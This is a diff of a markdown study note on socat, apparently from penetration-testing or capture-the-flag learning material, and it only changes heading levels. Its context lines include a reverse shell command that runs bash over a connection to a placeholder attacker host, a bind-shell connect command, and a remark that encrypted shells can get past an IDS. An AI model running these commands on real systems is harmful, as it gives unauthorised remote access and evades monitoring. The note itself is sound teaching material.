@@ -9,7 +9,7 @@ Socat is like [[Netcat]] on steroids. It can do all of the same things, and many
 
 Both Socat and Netcat have .exe versions for use on Windows.
 
-### Reverse Shells
+## Reverse Shells
 
 The syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:
 
@@ -33,7 +33,7 @@ This is the equivalent command for a Linux Target:
 socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
 
-### Bind Shells
+## Bind Shells
 
 On a Linux target we would use the following command:
 
@@ -49,7 +49,7 @@ Regardless of the target, we use this command on our attacking machine to connec
 socat TCP:<TARGET-IP>:<TARGET-PORT> -
 ```
 
-### Stabilised Shells
+## Stabilised Shells
 
 This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:
 
@@ -77,7 +77,7 @@ The first part is easy -- we're linking up with the listener running on our own 
 - `setsid`, creates the process in a new session
 - `sane`, stabilises the terminal, attempting to "normalise" it.
 
-### Encrypted Shells
+## Encrypted Shells
 
 One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells *cannot be spied on* unless you have the decryption key, and are *often able to bypass an IDS* as a result.
 
